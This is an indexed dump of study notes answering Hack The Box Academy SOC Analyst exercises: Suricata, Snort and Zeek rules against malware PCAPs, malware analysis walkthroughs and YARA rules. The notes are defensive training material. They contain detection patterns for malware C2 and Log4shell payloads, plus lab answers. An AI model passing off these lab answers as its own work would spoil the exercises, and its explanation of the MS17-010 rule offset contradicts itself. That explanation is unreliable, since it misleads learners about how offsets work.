pcre:\"/(PHPSESSID|SID|SSID|APISID|csrf-state|AWSALBCORS)\\=[a-z0-9]{32}\\;/\"; sid:1000003; rev:1;)\n</code></pre> <p>Q: In the /home/htb-student directory of this section's target, there is a file called local.rules. Within this file, there is a rule with sid 2024217, which is associated with the MS17-010 exploit. Additionally, there is a PCAP file named eternalblue.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to MS17-010. What is the minimum offset value that can be set to trigger an alert?</p> <p>The minimum offset value that can be set to trigger an alert in the Suricata rule provided is 4. Here\u2019s an explanation of why:</p> <p>In Suricata rules, the offset keyword specifies the byte offset within the packet payload where the search for the specified content begins.</p> <p>Let\u2019s break down the relevant part of the rule:</p> <pre><code>content:\"|ff|SMB|33 00 00 00 00 18 07 c0 00 00 00 00 00 00 00 00 00 00 00 00 08 ff fe 00 08|\";\noffset:9;\n</code></pre> <p><code>content:\"|ff|SMB|33 00 00 00 00 18 07 c0 00 00 00 00 00 00 00 00 00 00 00 00 08 ff fe 00 08|\";</code> specifies the hex bytes of the pattern to match in the payload.</p> <p><code>offset:9;</code> means that the search for this pattern starts at byte offset 9 within the payload.</p> <p>The reason the minimum offset value that can trigger the alert is 4 lies in the details of how the rule is constructed:</p> <p>The <code>content</code> part is a hexadecimal string representing a specific pattern related to the MS17-010 exploit.</p> <p>The <code>offset</code> value of 9 means that the matching starts 9 bytes into the payload.</p> <p>However, the <code>content</code> to match starts with the byte <code>ff</code>.</p> <p>If the <code>offset</code> value were set to 8 or lower, it would not find the <code>ff</code> byte at the correct position to match the pattern specified in the rule. </p> <p>Therefore, the minimum <code>offset</code> that correctly aligns with the beginning of the pattern in the payload is 9.</p> <p>To clarify further:</p> <p>Offset 8 would start just before the <code>ff</code> byte, which is not the start of the pattern.</p> <p>Offset 9 starts at the <code>ff</code> byte, which is correct for the pattern matching to work.</p> <p>Thus, the correct minimum <code>offset</code> value that allows the rule to correctly detect the pattern associated with the MS17\u2013010 exploit is 4.</p> <pre><code># enable the rule of externalblue\n$ vim local.rules\n\n# Add /home/htb-student/local.rules to rule-files\n$ sudo vim /etc/suricata/suricata.yaml\n\n$ sudo suricata -r /home/htb-student/pcaps/eternalblue.pcap -l . -k none\n$ cat fast.log\n# when change the offset value to 4, the fast.log starts having content\n</code></pre> <p></p> <pre><code># Suricata Rule Development Example 5: Detecting Dridex (TLS Encrypted)\nalert tls $EXTERNAL_NET any -&gt; $HOME_NET any (msg:\"ET MALWARE ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)\"; flow:established,from_server; content:\"|16|\"; content:\"|0b|\"; within:8; byte_test:3,&lt;,1200,0,relative; content:\"|03 02 01 02 02 09 00|\"; fast_pattern; content:\"|30 09 06 03 55 04 06 13 02|\"; distance:0; pcre:\"/^[A-Z]{2}/R\"; content:\"|55 04 07|\"; distance:0; content:\"|55 04 0a|\"; distance:0; pcre:\"/^.{2}[A-Z][a-z]{3,}\\s(?:[A-Z][a-z]{3,}\\s)?(?:[A-Z](?:[A-Za-z]{0,4}?[A-Z]|(?:\\.[A-Za-z]){1,3})|[A-Z]?[a-z]+|[a-z](?:\\.[A-Za-z]){1,3})\\.?[01]/Rs\"; content:\"|55 04 03|\"; distance:0; byte_test:1,&gt;,13,1,relative; content:!\"www.\"; distance:2; within:4; pcre:\"/^.{2}(?P&lt;CN&gt;(?:(?:\\d?[A-Z]?|[A-Z]?\\d?)(?:[a-z]{3,20}|[a-z]{3,6}[0-9_][a-z]{3,6})\\.){0,2}?(?:\\d?[A-Z]?|[A-Z]?\\d?)[a-z]{3,}(?:[0-9_-][a-z]{3,})?\\.(?!com|org|net|tv)[a-z]{2,9})[01].*?(?P=CN)[01]/Rs\"; content:!\"|2a 86 48 86 f7 0d 01 09 01|\"; content:!\"GoDaddy\"; sid:2023476; rev:5;)\n\n# Suricata Rule Development Example 6: Detecting Sliver (TLS Encrypted)\nalert tls any any -&gt; any any (msg:\"Sliver C2 SSL\"; ja3.hash; content:\"473cd7cb9faa642487833865d516e578\"; sid:1002; rev:1;)\n\n$ ja3 -a --json /home/htb-student/pcaps/sliverenc.pcap\n$ sudo suricata -r /home/htb-student/pcaps/sliverenc.pcap -l . -k none\n$ cat fast.log\n</code></pre> <p>Q: There is a file named trickbot.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to a certain variation of the Trickbot malware. Enter the precise string that should be specified in the content keyword of the rule with sid 100299 within the local.rules file so that an alert is triggered as your answer.</p> <pre><code>$ ja3 -a --json /home/htb-student/pcaps/trickbot.pcap\n$ vim local.rules\nalert tls any any -&gt; any any (msg:\"Trickbot C2 SSL\"; ja3.hash; content:\"72a589da586844d7f0818ce684948eea\"; sid:100299; rev:1;)\n\n$ sudo suricata -r /home/htb-student/pcaps/trickbot.pcap -l . -k none\n$ cat fast.log\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#snort", "title": "Snort", "text": "<p>Reading from a pcap file with the <code>-r</code> option or listening on an interface with <code>-i</code> will cause Snort to run in passive mode by default. If the DAQ supports inline, however, then users can specify the <code>-Q</code> flag to run Snort inline.</p> <p>Default configuration files, namely <code>snort.lua</code> and <code>snort_defaults.lua</code></p> <pre><code>$ sudo more /root/snorty/etc/snort/snort.lua\n\n$ snort --help-modules\n\n$ snort --help-config arp_spoof\n\n# Passing (and validating) configuration files to Snort \n$ snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq\n\n</code></pre> <p>DAQ: Data Acquisition Library</p> <p>Snort Inputs</p> <pre><code>$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/icmp.pcap\n\n$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -i ens160\n</code></pre> <p>Snort Rules</p> <pre><code>$ sudo vim /root/snorty/etc/snort/snort.lua\n</code></pre> <p>Snort Outputs</p> <p><code>Alerts</code>: When rules are configured, it is necessary to enable alerting (using the -A option) to view the details of detection events. There are multiple types of alert outputs available, including:</p> <p><code>-A cmg</code>: This option combines <code>-A fast -d -e</code> and displays alert information along with packet headers and payload.</p> <p><code>-A u2</code>: This option is equivalent to <code>-A unified2</code> and logs events and triggering packets in a binary file, which can be used for post-processing with other tools.</p> <p><code>-A csv</code>: This option outputs fields in comma-separated value format, providing customization options and facilitating pcap analysis.</p> <pre><code>$ snort --list-plugins | grep logger\n\n$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/icmp.pcap -A cmg\n\n$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/icmp.pcap -R /home/htb-student/local.rules -A cmg\n</code></pre> <p>Q: There is a file named wannamine.pcap in the /home/htb-student/pcaps directory. Run Snort on this PCAP file and enter how many times the rule with sid 1000001 was triggered as your answer.</p> <p><code>sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /home/htb-student/pcaps/wannamine.pcap -R /home/htb-student/local.rules -A cmg</code></p> <pre><code>detection\n\n             analyzed: 5146                \n           hard_evals: 234\n        file_searches: 2\n               alerts: 234\n         total_alerts: 234\n               logged: 234\n</code></pre> <pre><code># Snort Rule Development Example 1: Detecting Ursnif (Inefficiently)\nalert tcp any any -&gt; any any (msg:\"Possible Ursnif C2 Activity\"; flow:established,to_server; content:\"/images/\", depth 12; content:\"_2F\"; content:\"_2B\"; content:\"User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT\"; content:!\"Accept\"; content:!\"Cookie|3a|\"; content:!\"Referer|3a|\"; sid:1000002; rev:1;)\n\n$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/ursnif.pcap -A cmg\n\n$ scp htb-student@[TARGET IP]:/home/htb-student/pcaps/ursnif.pcap .\n\n# Snort Rule Development Example 2: Detecting Cerber\nalert udp $HOME_NET any -&gt; $EXTERNAL_NET any (msg:\"Possible Cerber Check-in\"; dsize:9; content:\"hi\", depth 2, fast_pattern; pcre:\"/^[af0-9]{7}$/R\"; detection_filter:track by_src, count 1, seconds 60; sid:2816763; rev:4;)\n\n$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/cerber.pcap -A cmg\n\n# Snort Rule Development Example 3: Detecting Patchwork\nalert http $HOME_NET any -&gt; $EXTERNAL_NET any (msg:\"OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon\"; flow:established,to_server; http_method; content:\"POST\"; http_uri; content:\".php?profile=\"; http_client_body; content:\"ddager=\", depth 7; http_client_body; content:\"&amp;r1=\", distance 0; http_header; content:!\"Accept\"; http_header; content:!\"Referer|3a|\"; sid:10000006; rev:1;)\n\n$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg\n\n# Snort Rule Development Example 4: Detecting Patchwork (SSL)\nalert tcp $EXTERNAL_NET any -&gt; $HOME_NET any (msg:\"Patchwork SSL Cert Detected\"; flow:established,from_server; content:\"|55 04 03|\"; content:\"|08|toigetgf\", distance 1, within 9; classtype:trojan-activity; sid:10000008; rev:1;)\n\n$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg\n</code></pre> <p>Q: There is a file named log4shell.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to log4shell exploitation attempts, where the payload is embedded within the user agent. Enter the keyword that should be specified right before the content keyword of the rule with sid 10000098 within the local.rules file so that an alert is triggered as your answer. Answer format: [keyword];</p> <pre><code># rule: http_header;\nalert http any any -&gt; any any (msg:\"Log4shell Attempt Detected\";http_header; content:\"|24 7b|jndi|3a|ldap|3a 2f 2f|\",fast_pattern, nocase; sid:10000098; rev:1;)\n\n$ sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/log4shell.pcap -A cmg \n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#zeek", "title": "Zeek", "text": "<p>Zeek Logs conn.log: This log provides details about IP, TCP, UDP, and ICMP connections.</p> <p>dns.log: Here, you'll find the details of DNS queries and responses.</p> <p>http.log: This log captures the details of HTTP requests and responses.</p> <p>ftp.log: Details of FTP requests and responses are logged here.</p> <p>smtp.log: This log covers SMTP transactions, such as sender and recipient details.</p> <pre><code># Intrusion Detection With Zeek Example 1: Detecting Beaconing Malware\n$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psempire.pcap\n$ cat conn.log\n\n# Intrusion Detection With Zeek Example 2: Detecting DNS Exfiltration\n$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/dnsexfil.pcapng\n$ cat dns.log\n$ cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7\n\n# Intrusion Detection With Zeek Example 3: Detecting TLS Exfiltration\n$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/tlsexfil.pcap\n$ cat conn.log\n\n$ cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes | sort | grep -v -e '^$' | grep -v '-' | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10\n\n# Intrusion Detection With Zeek Example 4: Detecting PsExec\n$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psexec_add_user.pcap\n$ cat smb_files.log\n$ cat dce_rpc.log\n$ cat smb_mapping.log\n</code></pre> <p>Q1: There is a file named printnightmare.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the PrintNightmare (https://labs.jumpsec.com/printnightmare-network-analysis/) vulnerability. Enter the zeek log that can help us identify the suspicious spooler functions as your answer. Answer format: _.log</p> <p><code>/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/printnightmare.pcap &amp;&amp; ls</code></p> <p></p> <p>Q2: There is a file named revilkaseya.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the REvil ransomware Kaseya supply chain attack. Enter the total number of bytes that the victim has transmitted to the IP address 178.23.155.240 as your answer.</p> <pre><code>$ /usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/revilkaseya.pcap\n\n$ cat conn.log | grep \"178.23.155.240\"\n\n\n$ cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes | grep \"178.23.155.240\" | awk '{sum += $3} END {print sum}'This command efficiently filters and sums the bytes transmitted to the specified IP address directly from the conn.log file using standard Unix utilities (zeek-cut, grep, and awk).\n</code></pre> <p></p> <p>1702+609=2311</p> <p>Suricata Q:  There is a file named pipekatposhc2.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to WMI execution. Add yet another content keyword right after the msg part of the rule with sid 2024233 within the local.rules file so that an alert is triggered and enter the specified payload as your answer. Answer format: C____e</p> <pre><code>$ cat local.rules | grep 2024233\n\nalert tcp any any -&gt; any any (msg:\"WMI Execution Detected\"; content:\"Win32_ProcessStartup\"; content:\"powershell\"; sid:2024233; rev:2;)\n</code></pre> <p>In the context of WMI, when PowerShell scripts or commands are executed remotely, often there is a process creation event associated with it. The term \u201cCreate\u201d can be a relevant keyword to include because it signifies the creation of processes, which is a common indicator in WMI-based execution scenarios.</p> <pre><code>alert tcp any any -&gt; any any (msg:\"WMI Execution Detected\"; content:\"Create\"; content:\"Win32_ProcessStartup\"; content:\"powershell\"; sid:2024233; rev:2;)\n\n# Add /home/htb-student/local.rules to rule-files\n$ sudo vim /etc/suricata/suricata.yaml\n$ sudo suricata -r /home/htb-student/pcaps/pipekatposhc2.pcap -l . -k none\n$ cat fast.log\n\n12/26/2019-08:04:55.353819  [**] [1:2024233:2] WMI Execution Detected [**] [Classification: (null)] [Priority: 3] {TCP} 192.168.1.46:58198 -&gt; 192.168.1.62:49154\n</code></pre> <p>Snort Q: There is a file named wannamine.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the Overpass-the-hash technique which involves Kerberos encryption type downgrading. Replace XX with the appropriate value in the last content keyword of the rule with sid XXXXXXX within the local.rules file so that an alert is triggered as your answer.</p> <p>In the context of Kerberos encryption types, each encryption type is identified by a specific number. RC4-HMAC encryption type is represented by the number 23 (0x17 in hexadecimal). When configuring an IDS/IPS rule to detect Kerberos encryption type downgrades to RC4, you need to specify the correct hexadecimal representation of the encryption type you\u2019re looking for.</p> <p>Here\u2019s the breakdown:</p> <p>RC4-HMAC encryption type is represented by the hexadecimal value 0x17. In the Snort/Suricata rule syntax, hexadecimal values are typically written without the \u201c0x\u201d prefix.</p> <p>Therefore, when you\u2019re modifying the rule to detect Kerberos encryption type downgrades to RC4, you should use the hexadecimal representation of RC4-HMAC, which is 17.</p> <p><code>alert tcp $HOME_NET any -&gt; any 88 (msg: \"Kerberos Ticket Encryption Downgrade to RC4 Detected\"; flow: no_stream, established, to_server; content: \"|A1 03 02 01 05 A2 03 02 01 0A|\", offset 12, depth 10; content: \"|A1 03 02 01 02|\", distance 5, within 6; content: \"|A0 03 02 01 17|\", distance 6, within 6; content: \"krbtgt\", distance 0; sid:9999999;)</code></p> <p>Zeek Q: There is a file named neutrinogootkit.pcap in the /home/htb-student/pcaps directory, which contains network traffic related to the Neutrino exploit kit sending Gootkit malware. Enter the x509.log field name that includes the \"MyCompany Ltd.\" trace as your answer.</p> <pre><code>/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/neutrinogootkit.pcap\n\n$ grep \"MyCompany Ltd.\" x509.log\n</code></pre> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#introduction-to-malware-analysis", "title": "Introduction to Malware Analysis", "text": ""}, {"location": "HTB/Academy/SOC%20Analyst/#windows-internals", "title": "Windows Internals", "text": "<p>Q1: In the C:\\Samples\\MalwareAnalysis directory of this section's target, there is a file called potato.exe. Use pestudio (C:\\Tools\\pestudio\\pestudio) to examine this executable's sections and provide the entropy of the .text section as your answer.</p> <p></p> <p>Q2:  In the C:\\Samples\\MalwareAnalysis directory of this section's target, there is a file called potato.exe. Use x64dbg (C:\\Tools\\x64dbg\\release\\x64) to open this executable and navigate to the Symbols tab. Enter the exported Kernel32.dll function whose name starts with \"Attach\". Answer format: Attach_</p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#static-analysis-on-linux", "title": "Static Analysis On Linux", "text": "<p>Through static analysis, we endeavor to extract pivotal information which includes:</p> <pre><code>File type\nFile hash\nStrings\nEmbedded elements\nPacker information\nImports\nExports\nAssembly code\n</code></pre> <p></p> <p>Identifying The File Type</p> <p><code>$ file /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p> <p>Malware Fingerprinting</p> <p><code>$ md5sum /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p> <p><code>$ sha256sum /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p> <p>Use the pefile Python module to compute the IMPHASH of a file</p> <pre><code># imphash_calc.py\nimport sys\nimport pefile\nimport peutils\n\npe_file = sys.argv[1]\npe = pefile.PE(pe_file)\nimphash = pe.get_imphash()\n\nprint(imphash)\n</code></pre> <p><code>$ python3 imphash_calc.py /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p> <p>Fuzzy Hashing (SSDEEP)</p> <p>The SSDEEP algorithm allocates more weight to longer sequences of common blocks, making it highly effective in identifying files that have undergone minor modifications, or are similar but not identical, such as different variations of a malicious sample.</p> <p><code>$ ssdeep /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p> <p>The command line arguments <code>-pb</code> can be used to initiate matching mode in SSDEEP (while we are on the directory where the malware samples are stored - <code>/home/htb-student/Samples/MalwareAnalysis</code> in our case).</p> <p><code>$ ssdeep -pb *</code></p> <p>Section Hashing (Hashing PE Sections)</p> <p>Section hashing, (hashing PE sections) is a powerful technique that allows analysts to identify sections of a Portable Executable (PE) file that have been modified. This can be particularly useful for identifying minor variations in malware samples, a common tactic employed by attackers to evade detection.</p> <p>By applying section hashing, security analysts can identify parts of a PE file that have been tampered with or altered. This can help identify similar malware samples, even if they have been slightly modified to evade traditional signature-based detection methods.</p> <pre><code># section_hashing.py\nimport sys\nimport pefile\npe_file = sys.argv[1]\npe = pefile.PE(pe_file)\nfor section in pe.sections:\n    print (section.Name, \"MD5 hash:\", section.get_hash_md5())\n    print (section.Name, \"SHA256 hash:\", section.get_hash_sha256())\n</code></pre> <p><code>$ python3 section_hashing.py /home/htb-student/Samples/MalwareAnalysis/Ransomware.wannacry.exe</code></p> <p>String Analysis</p> <pre><code># -n specifies to print a sequence of at least the number specified - in our case, 15.\n$ strings -n 15 /home/htb-student/Samples/MalwareAnalysis/dharma_sample.exe\n$ floss /home/htb-student/Samples/MalwareAnalysis/dharma_sample.exe\n</code></pre> <p>Unpacking UPX-packed Malware</p> <p>Ultimate Packer for Executables (UPX)</p> <p>In our static analysis, we might stumble upon a malware sample that's been compressed or obfuscated using a technique referred to as packing</p> <pre><code>$ strings /home/htb-student/Samples/MalwareAnalysis/packed/credential_stealer.exe\n\n# unpack the malware using the UPX tool\n$ upx -d -o unpacked_credential_stealer.exe credential_stealer.exe\n\n$ strings unpacked_credential_stealer.exe\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#static-analysis-on-windows", "title": "Static Analysis On Windows", "text": "<p>Identifying The File Type</p> <p>CFF Explorer</p> <p>Malware Fingerprinting</p> <p><code>Get-FileHash -Algorithm MD5 C:\\Samples\\MalwareAnalysis\\Ransomware.wannacry.exe</code></p> <p><code>Get-FileHash -Algorithm SHA256 C:\\Samples\\MalwareAnalysis\\Ransomware.wannacry.exe</code></p> <p>File Hash Lookup</p> <p>VirusTotal</p> <p>Fuzzy Hashing (SSDEEP)</p> <p><code>ssdeep.exe C:\\Samples\\MalwareAnalysis\\Ransomware.wannacry.exe</code></p> <p>Section Hashing (Hashing PE Sections)</p> <p>python code same as analysis on Linux</p> <p>and</p> <p>pestudio</p> <p>String Analysis</p> <pre><code>strings C:\\Samples\\MalwareAnalysis\\dharma_sample.exe\n\nfloss shell.exe\n</code></pre> <p>Unpacking UPX-packed Malware</p> <p><code>upx -d -o unpacked_credential_stealer.exe C:\\Samples\\MalwareAnalysis\\packed\\credential_stealer.exeupx -d -o unpacked_credential_stealer.exe C:\\Samples\\MalwareAnalysis\\packed\\credential_stealer.exe</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#dynamic-analysis", "title": "Dynamic Analysis", "text": "<p>In dynamic analysis, we observe and interpret the behavior of the malware while it is running, or in action.</p> <p>Dynamic Analysis With Noriben</p> <p>Noriben uses ProcMon to capture system events but then filters and analyzes this data to extract meaningful information and pinpoint malicious activities.</p> <pre><code>python .\\Noriben.py\n</code></pre> <p>manually launch <code>ProcMon</code> (available at C:\\Tools\\sysinternals) using its default, more inclusive, configuration.</p> <p>Q: Use Noriben to perform dynamic analysis on shell.exe. Enter the IP address shell.exe pings as your answer.</p> <p>127.0.0.1</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#code-analysis", "title": "Code Analysis", "text": "<p>Reverse Engineering &amp; Code Analysis</p> <p>A Disassembler is our tool of choice when we wish to conduct a static analysis of the code, meaning that we need not execute the code. Some prime examples of disassemblers include <code>IDA</code>, <code>Cutter</code>, and <code>Ghidra</code>.</p> <p>A Debugger, on the other hand, serves a dual purpose. Like a disassembler, it decodes machine code into assembly instructions. Additionally, it allows us to execute code in a controlled manner, proceeding instruction by instruction, skipping to specific locations, or halting the execution flow at designated points using breakpoints. Examples of debuggers include <code>x32dbg</code>, <code>x64dbg</code>, <code>IDA</code>, and <code>OllyDbg</code>.</p> <p>Recognizing the Main Function in IDA</p> <p>The <code>start</code> function, which is the program's entry point and is generally responsible for setting up the runtime environment before invoking the actual <code>main</code> function. </p> <p><code>Get-ChildItem env:TEMP</code></p> <p>Q: Download additional_samples.zip from this module's resources (available at the upper right corner) and transfer the .zip file to this section's target. Unzip additional_samples.zip (password: infected) and use IDA to analyze orange.exe. Enter the registry key that it modifies for persistence as your answer. Answer format: SOFTWARE____</p> <pre><code>push    offset aNR      ; \"n\\\\R\"\npush    offset aRsi     ; \"rsi\"\npush    offset aRent    ; \"rent\"\npush    offset aCu      ; \"\\\\Cu\"\npush    offset aOw      ; \"ow\"\npush    offset aTW      ; \"t\\\\W\"\npush    offset aRoso    ; \"roso\"\npush    offset aWareM   ; \"ware\\\\M\"\nlea     eax, [ebp+74h+SubKey]\npush    offset aSoftSicSfSindS ; \"Soft%sic%sf%sind%ss%sr%sVe%so%sun\"\npush    eax             ; LPSTR\n</code></pre> <p>Replace <code>%s</code> use the strings above</p> <p>Software\\Microsoft\\Windows\\CurrentVersion\\Run</p> <p>Software\\Microsoft\\Windows\\CurrentVersion\\Run</p> <p>Simulating Internet Services</p> <pre><code>$ sudo nano /etc/inetsim/inetsim.conf\n\n# Our machine's/VM's TUN IP: Host Kali's IP\nservice_bind_address &lt;Our machine's/VM's TUN IP&gt;\ndns_default_ip &lt;Our machine's/VM's TUN IP&gt;\ndns_default_hostname www\ndns_default_domainname iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\n\n$ sudo vim /etc/default/inetsim\nENABLED=1\n\n$ sudo inetsim \n</code></pre> <p>1EF56DA0000 Configuring INetSim</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#creating-detection-rules", "title": "Creating Detection Rules", "text": "<p>YARA (Yet Another Recursive Acronym)</p> <pre><code>$ mkdir /home/htb-student/Samples/MalwareAnalysis/Test\n\n$ cp /home/htb-student/Samples/MalwareAnalysis/shell.exe /home/htb-student/Samples/MalwareAnalysis/Test/\n\n$ sudo python3 yarGen.py -m /home/htb-student/Samples/MalwareAnalysis/Test/\n\n$ cat yargen_rules.yar \n\n$ yara /home/htb-student/yarGen-0.23.4/yargen_rules.yar /home/htb-student/Samples/MalwareAnalysis/\nhome_htb_student_Samples_MalwareAnalysis_Test_shell /home/htb-student/Samples/MalwareAnalysis//shell.exe\n</code></pre> <p>Yara documentation : https://yara.readthedocs.io/en/stable/writingrules.html</p> <p>Yara resources - https://github.com/InQuest/awesome-yara</p> <p>The DFIR Report - https://github.com/The-DFIR-Report/Yara-Rules</p> <p>Sigma</p> <p>Sigma documentation : https://github.com/SigmaHQ/sigma/wiki/Specification</p> <p>Sigma resources - https://github.com/SigmaHQ/sigma/tree/master/rules</p> <p>The DFIR Report - https://github.com/The-DFIR-Report/Sigma-Rules/tree/main/rules</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#javascript-deobfuscation", "title": "JavaScript Deobfuscation", "text": "<p>https://jsconsole.com </p> <p>https://obfuscator.io</p> <p>There are many other JavaScript obfuscators, like <code>JJ Encode</code> or <code>AA Encode</code>. However, such obfuscators usually make code execution/compilation very slow, so it is not recommended to be used unless for an obvious reason, like bypassing web filters or restrictions.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#deobfuscate", "title": "Deobfuscate", "text": "<p>UnPacker: https://matthewfl.com/unPacker.html</p> <p><code>$ curl -s http://SERVER_IP:PORT/ -X POST -d \"param1=sample\"</code></p> <p>Hex Encode</p> <p><code>$ echo https://www.hackthebox.eu/ | xxd -p</code></p> <p>Hex Decode</p> <p><code>$ echo 68747470733a2f2f7777772e6861636b746865626f782e65752f0a | xxd -p -r</code></p> <p>Caesar/Rot13</p> <p>Caesar cipher shifts each letter by a fixed number. </p> <p>Rot13 shifts each character 13 times forward.</p> <pre><code># Rot13 Encode\n$ echo https://www.hackthebox.eu/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n\n# Rot13 Decode\n$ echo uggcf://jjj.unpxgurobk.rh/ | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n</code></pre> <p>Cipher Identifier can help us automatically determine the type of encoding. </p> <p><code>$ curl -s http://94.237.63.132:48085/serial.php -X POST -d \"serial=7h15_15_a_s3cr37_m3554g3\"</code></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#yara-sigma-for-soc-analysts", "title": "YARA &amp; Sigma for SOC Analysts", "text": "<p>Both YARA and Sigma rules grant SOC analysts potent capabilities to detect and respond to security threats. YARA excels in file and memory analysis, as well as pattern matching, whereas Sigma is particularly adept at log analysis and SIEM systems.</p> <p>YARA rules: https://github.com/Yara-Rules/rules/tree/master/malware, https://github.com/mikesxrs/Open-Source-YARA-rules/tree/master</p> <p>Sigma rules https://github.com/SigmaHQ/sigma/tree/master/rules, https://github.com/joesecurity/sigma-rules, https://github.com/mdecrevoisier/SIGMA-detection-rules</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#yara-and-yara-rules", "title": "YARA and YARA Rules", "text": "<p>Each rule in YARA starts with the keyword <code>rule</code> followed by a <code>rule identifier</code>. Rule identifiers are case sensitive where the first character cannot be a digit, and cannot exceed 128 characters.</p> <p>The following keywords are reserved and cannot be used as an identifier:</p> <p></p> <pre><code>rule Ransomware_WannaCry {\n\n    meta:\n        author = \"Madhukar Raina\"\n        version = \"1.0\"\n        description = \"Simple rule to detect strings from WannaCry ransomware\"\n        reference = \"https://www.virustotal.com/gui/file/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa/behavior\" \n\n    strings:\n        $wannacry_payload_str1 = \"tasksche.exe\" fullword ascii\n        $wannacry_payload_str2 = \"www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\" ascii\n        $wannacry_payload_str3 = \"mssecsvc.exe\" fullword ascii\n\n    condition:\n        all of them\n}\n</code></pre> <pre><code># yara\ncondition:\n        filesize &lt; 100KB and (uint16(0) == 0x5A4D or uint16(0) == 0x4D5A)\n</code></pre> <p>This condition also specifies that the first 2 bytes of the file must be either 0x5A4D (ASCII MZ) or 0x4D5A (ASCII ZM), by using <code>uint16(0)</code></p> <p><code>uint16</code>: This indicates the data type to be extracted, which is a 16-bit unsigned integer (2 bytes).</p> <p><code>(0)</code>: The value inside the parentheses represents the offset from where the extraction should start. In this case, 0 means the function will extract the 16-bit value starting from the beginning of the data being scanned. The condition uses uint16(0) to compare the first 2 bytes of the file with specific values.</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#developing-yara-rule", "title": "Developing YARA Rule", "text": "<pre><code>rule UPX_packed_executable\n{\n    meta:\n    description = \"Detects UPX-packed executables\"\n\n    strings: \n    $string_1 = \"UPX0\"\n    $string_2 = \"UPX1\"\n    $string_3 = \"UPX2\"\n\n    condition:\n    all of them\n}\n</code></pre> <p>yarGen is our go-to tool when we need an automatic YARA rule generator.</p> <pre><code>$ python3 yarGen.py -m /home/htb-student/temp -o htb_sample.yar\n</code></pre> <p>Example 1: ZoxPNG RAT Used by APT17</p> <pre><code>/*\n   Yara Rule Set\n   Author: Florian Roth\n   Date: 2017-10-03\n   Identifier: APT17 Oct 10\n   Reference: https://goo.gl/puVc9q\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule APT17_Malware_Oct17_Gen {\n   meta:\n      description = \"Detects APT17 malware\"\n      license = \"Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE\"\n      author = \"Florian Roth (Nextron Systems)\"\n      reference = \"https://goo.gl/puVc9q\"\n      date = \"2017-10-03\"\n      hash1 = \"0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2\"\n      hash2 = \"07f93e49c7015b68e2542fc591ad2b4a1bc01349f79d48db67c53938ad4b525d\"\n      hash3 = 